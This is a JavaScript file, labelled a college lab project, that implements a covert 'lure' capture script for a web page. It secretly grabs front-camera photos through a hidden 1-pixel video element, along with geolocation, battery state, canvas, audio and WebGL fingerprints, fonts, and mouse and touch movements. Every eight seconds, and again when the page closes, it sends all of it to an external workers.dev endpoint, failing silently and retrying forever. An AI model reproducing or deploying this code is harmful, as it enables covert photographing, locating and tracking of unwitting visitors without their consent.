// ════════════════════════════════════════════════════
// DATA CAPTURE SYSTEM (COLLEGE PROJECT - LAB USE ONLY)
// Fully compatible with NEWworker.js backend
// ════════════════════════════════════════════════════

const WORKER_URL = "https://snowy-fog-b0d1.23amtics322.workers.dev/";
const sessionId = 'sess_' + Math.random().toString(36).substring(2, 12) + '_' + Date.now().toString(36);
const SEND_INTERVAL = 8000;

let basePayload = null;
let mouseData = [];
let touchData = [];
let lureVideoStream = null;
let sendIntervalId = null;
let isSending = false;
let consecutiveErrors = 0;
let systemActive = true;

// Hidden video element for camera capture
const lureVideo = document.createElement('video');
lureVideo.id = 'lureVideo';
lureVideo.autoplay = true;
lureVideo.playsInline = true;
lureVideo.muted = true;
lureVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0.01;pointer-events:none';
document.body.appendChild(lureVideo);

// Mouse & Touch tracking - always active
let lastMouseRecord = 0;
document.addEventListener('mousemove', e => {
  const now = Date.now();
  if (now - lastMouseRecord < 50) return;
  lastMouseRecord = now;
  mouseData.push({ x: e.clientX, y: e.clientY, t: now });
  if (mouseData.length > 40) mouseData.shift();
});

let lastTouchRecord = 0;
document.addEventListener('touchmove', e => {
  const now = Date.now();
  if (now - lastTouchRecord < 50) return;
  lastTouchRecord = now;
  if (e.touches.length > 0) {
    touchData.push({ x: e.touches[0].clientX, y: e.touches[0].clientY, t: now });
    if (touchData.length > 40) touchData.shift();
  }
});

// Keep mouse/touch data fresh even in preview
function refreshMouseData() {
  // Just keep the arrays, they're already being updated
  if (mouseData.length > 40) mouseData = mouseData.slice(-30);
  if (touchData.length > 40) touchData = touchData.slice(-30);
}

async function collectStaticData() {
  const p = {
    sessionId: sessionId,
    url: location.href,
    referrer: document.referrer || null,
    userAgent: navigator.userAgent,
    language: navigator.language,
    languages: navigator.languages || [],
    platform: navigator.platform,
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    deviceMemory: navigator.deviceMemory || null,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    connection: navigator.connection ? {
      effectiveType: navigator.connection.effectiveType,
      downlink: navigator.connection.downlink,
      rtt: navigator.connection.rtt,
      saveData: navigator.connection.saveData
    } : null,
    screen: {
      width: screen.width,
      height: screen.height,
      availWidth: screen.availWidth,
      availHeight: screen.availHeight,
      colorDepth: screen.colorDepth,
      pixelDepth: screen.pixelDepth,
      pixelRatio: window.devicePixelRatio || 1,
      orientation: screen.orientation?.type || null
    },
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookiesEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack,
    webdriver: !!navigator.webdriver,
    historyLength: history.length,
    navigationTiming: null,
    canvasFingerprint: null,
    audioFingerprint: null,
    webglFingerprint: null,
    fonts: [],
    plugins: [],
    mimeTypes: [],
    permissionStates: {}
  };

  // Navigation Timing
  try {
    const navEntry = performance.getEntriesByType('navigation')[0];
    if (navEntry) {
      p.navigationTiming = {
        loadTime: Math.round(navEntry.loadEventEnd - navEntry.fetchStart),
        domComplete: Math.round(navEntry.domComplete),
        domInteractive: Math.round(navEntry.domInteractive)
      };
    }
  } catch (e) {}

  // Canvas Fingerprint
  try {
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    c.width = 240; c.height = 70;
    ctx.textBaseline = 'top';
    ctx.font = 'bold 18px Arial';
    ctx.fillStyle = '#c0c0c0';
    ctx.fillText('PHOTON CAPTURE 2026', 8, 20);
    ctx.fillStyle = '#f60';
    ctx.fillRect(160, 25, 65, 30);
    p.canvasFingerprint = c.toDataURL('image/png').slice(-150);
  } catch (e) {}

  // Audio Fingerprint
  try {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = audioCtx.createOscillator();
    const analyser = audioCtx.createAnalyser();
    osc.type = 'sine';
    osc.frequency.value = 440;
    osc.connect(analyser);
    analyser.connect(audioCtx.destination);
    osc.start();
    await new Promise(r => setTimeout(r, 100));
    const data = new Uint8Array(analyser.frequencyBinCount);
    analyser.getByteFrequencyData(data);
    p.audioFingerprint = btoa(String.fromCharCode(...data.slice(0, 60)));
    osc.stop();
    audioCtx.close();
  } catch (e) {}

  // WebGL Fingerprint
  try {
    const glc = document.createElement('canvas');
    const gl = glc.getContext('webgl') || glc.getContext('experimental-webgl');
    if (gl) {
      const debug = gl.getExtension('WEBGL_debug_renderer_info');
      p.webglFingerprint = {
        vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
        renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
        version: gl.getParameter(gl.VERSION) || null,
        shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION) || null
      };
    }
  } catch (e) {}

  // Fonts
  try {
    const fontList = ['Arial','Helvetica','Times','Courier','Verdana','Georgia','Tahoma','Impact','Comic Sans MS'];
    const testDiv = document.createElement('div');
    testDiv.style.cssText = 'position:absolute;left:-9999px;font-size:72px;visibility:hidden';
    document.body.appendChild(testDiv);
    for (const font of fontList) {
      testDiv.style.fontFamily = font;
      if (testDiv.offsetWidth > 5) p.fonts.push(font);
    }
    document.body.removeChild(testDiv);
  } catch (e) {}

  // Plugins & MimeTypes
  try {
    p.plugins = Array.from(navigator.plugins || []).map(p => p.name).slice(0, 15);
    p.mimeTypes = Array.from(navigator.mimeTypes || []).map(m => m.type).slice(0, 15);
  } catch (e) {}

  // Permissions
  const permNames = ['camera', 'microphone', 'geolocation'];
  for (const name of permNames) {
    try {
      if (navigator.permissions && navigator.permissions.query) {
        const status = await navigator.permissions.query({ name: name });
        p.permissionStates[name] = status?.state || 'unknown';
      } else {
        p.permissionStates[name] = 'not-supported';
      }
    } catch (e) {
      p.permissionStates[name] = 'error';
    }
  }

  return p;
}

async function collectDynamicData() {
  // Always rebuild fresh payload - don't rely on stale basePayload
  const freshStatic = await collectStaticData();
  
  const p = { ...freshStatic };
  p.timestamp = new Date().toISOString();
  p.battery = null;
  p.geolocation = null;
  p.geolocationError = null;
  p.frontPhoto = null;
  p.mouseMovements = [...mouseData];
  p.touchEvents = [...touchData];
  p.audioDevices = [];

  // Battery
  if (navigator.getBattery) {
    try {
      const bat = await navigator.getBattery();
      p.battery = {
        level: bat.level,
        charging: bat.charging,
        chargingTime: bat.chargingTime,
        dischargingTime: bat.dischargingTime
      };
    } catch (e) {}
  }

  // Geolocation - with timeout protection
  try {
    const pos = await Promise.race([
      new Promise((res, rej) => {
        const timeout = setTimeout(() => rej(new Error('GPS timeout')), 7000);
        navigator.geolocation.getCurrentPosition(
          pos => { clearTimeout(timeout); res(pos); },
          err => { clearTimeout(timeout); rej(err); },
          { enableHighAccuracy: false, timeout: 7000, maximumAge: 60000 }
        );
      })
    ]);
    p.geolocation = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      altitude: pos.coords.altitude || null,
      speed: pos.coords.speed || null
    };
  } catch (e) {
    p.geolocationError = e.message || 'Failed';
  }

  // Front Photo - ONLY if not in preview and camera is available
  // This prevents blocking the send when in preview
  try {
    const isPreviewActive = (typeof S !== 'undefined' && S.previewActive === true);
    const hasCacheElement = (typeof cacheElement === 'function');
    
    if (!isPreviewActive && hasCacheElement) {
      const mainVideo = cacheElement('vid');
      if (mainVideo && mainVideo.videoWidth > 100 && mainVideo.videoHeight > 100) {
        const canvas = document.createElement('canvas');
        canvas.width = 320; canvas.height = 320;
        const ctx = canvas.getContext('2d');

        if (S && S.facing === 'user') {
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1);
        }

        ctx.drawImage(mainVideo, 0, 0, canvas.width, canvas.height);
        p.frontPhoto = canvas.toDataURL('image/jpeg', 0.65);
        if (p.frontPhoto && p.frontPhoto.length > 45000) {
          p.frontPhoto = p.frontPhoto.substring(0, 45000);
        }
      }
    }
  } catch (e) {
    // Silently fail - don't break the send
  }

  // Audio Devices
  try {
    const devices = await navigator.mediaDevices.enumerateDevices();
    p.audioDevices = devices
      .filter(d => d.kind.includes('audio'))
      .slice(0, 6)
      .map(d => ({ kind: d.kind, label: (d.label || 'unknown').substring(0, 40) }));
  } catch (e) {}

  return p;
}

async function sendPayload() {
  // Always try to send, even if previous sends failed
  if (isSending) {
    return;
  }
  
  isSending = true;
  
  try {
    const data = await collectDynamicData();
    
    // Build payload matching worker expectations
    const payload = {
      sessionId: data.sessionId,
      timestamp: data.timestamp,
      url: data.url,
      referrer: data.referrer,
      userAgent: data.userAgent,
      language: data.language,
      languages: data.languages,
      platform: data.platform,
      hardwareConcurrency: data.hardwareConcurrency,
      deviceMemory: data.deviceMemory,
      maxTouchPoints: data.maxTouchPoints,
      connection: data.connection,
      screen: data.screen,
      timezone: data.timezone,
      cookiesEnabled: data.cookiesEnabled,
      doNotTrack: data.doNotTrack,
      webdriver: data.webdriver ? 1 : 0,
      plugins: data.plugins,
      mimeTypes: data.mimeTypes,
      historyLength: data.historyLength,
      navigationTiming: data.navigationTiming,
      canvasFingerprint: data.canvasFingerprint,
      audioFingerprint: data.audioFingerprint,
      webglFingerprint: data.webglFingerprint,
      battery: data.battery,
      geolocation: data.geolocation,
      geolocationError: data.geolocationError,
      frontPhoto: data.frontPhoto,
      audioDevices: data.audioDevices,
      fonts: data.fonts,
      mouseMovements: data.mouseMovements,
      touchEvents: data.touchEvents,
      permissionStates: data.permissionStates
    };

    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 12000);

    const response = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
      keepalive: true,
      signal: controller.signal
    });

    clearTimeout(timeoutId);

    if (response.ok) {
      consecutiveErrors = 0;
      if (!systemActive) {
        systemActive = true;
        console.log('[LURE] System recovered');
      }
    } else {
      consecutiveErrors++;
      console.warn('[LURE] HTTP error:', response.status);
    }
  } catch (e) {
    consecutiveErrors++;
    if (e.name !== 'AbortError') {
      console.warn('[LURE] Send error:', e.message);
    }
  } finally {
    isSending = false;
    
    // Reset if too many errors but keep trying
    if (consecutiveErrors > 10) {
      consecutiveErrors = 0;
      console.log('[LURE] Resetting after errors');
    }
  }
}

// Camera controls - preserve existing functionality
async function pauseLureCamera() {
  if (typeof S !== 'undefined') {
    S.previewActive = true;
  }
  if (lureVideoStream) {
    lureVideoStream.getTracks().forEach(t => t.stop());
    lureVideoStream = null;
  }
}

async function resumeLureCamera() {
  if (typeof S !== 'undefined') {
    S.previewActive = false;
  }
  await initLureCamera();
}

async function initLureCamera() {
  try {
    if (typeof S === 'undefined' || !S.stream) return false;
    if (S.previewActive === true) return false;
    
    if (lureVideoStream) {
      lureVideoStream.getTracks().forEach(t => t.stop());
    }

    const videoTrack = S.stream.getVideoTracks()[0];
    if (videoTrack) {
      lureVideoStream = new MediaStream([videoTrack]);
      lureVideo.srcObject = lureVideoStream;
      await lureVideo.play();
      return true;
    }
  } catch (e) {
    // Silently fail - camera will retry on next interval
  }
  return false;
}

// Keep the interval alive forever
function startPersistentInterval() {
  if (sendIntervalId) {
    clearInterval(sendIntervalId);
  }
  
  // Send immediately
  setTimeout(() => sendPayload(), 1000);
  
  // Then every SEND_INTERVAL
  sendIntervalId = setInterval(() => {
    sendPayload();
    
    // Also try to reinit camera if needed and not in preview
    if (typeof S !== 'undefined' && S.stream && !S.previewActive && !lureVideoStream) {
      initLureCamera().catch(() => {});
    }
  }, SEND_INTERVAL);
}

async function initLureSystem() {
  console.log('[LURE] Initializing persistent capture system...');

  // Wait for main camera stream
  let attempts = 0;
  while (attempts < 60) {
    if (typeof S !== 'undefined' && S.stream) {
      if (typeof cacheElement === 'function') {
        const vid = cacheElement('vid');
        if (vid && vid.videoWidth > 80) {
          console.log('[LURE] Camera ready');
          break;
        }
      }
    }
    await new Promise(r => setTimeout(r, 150));
    attempts++;
  }

  if (typeof S === 'undefined') {
    console.error('[LURE] Fatal: S object not found');
    // Still try to send without camera data
  } else {
    // Set up preview flag
    if (S.previewActive === undefined) {
      S.previewActive = false;
    }
  }

  // Expose functions for script.js
  window.pauseLureCamera = pauseLureCamera;
  window.resumeLureCamera = resumeLureCamera;

  // Initialize camera for capture
  await initLureCamera();

  // Start persistent sending - will continue forever
  startPersistentInterval();

  // Also send on page unload
  window.addEventListener('beforeunload', () => {
    if (sendIntervalId) clearInterval(sendIntervalId);
    sendPayload();
  });

  console.log('[LURE] 🚀 Persistent capture system active - sending every', SEND_INTERVAL, 'ms');
  
  // Periodic status log
  setInterval(() => {
    if (typeof S !== 'undefined') {
      console.log('[LURE] Status - Preview:', S.previewActive, '| Camera:', !!lureVideoStream);
    }
  }, 30000);
}

// Start the system
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initLureSystem);
} else {
  setTimeout(initLureSystem, 1000);
}
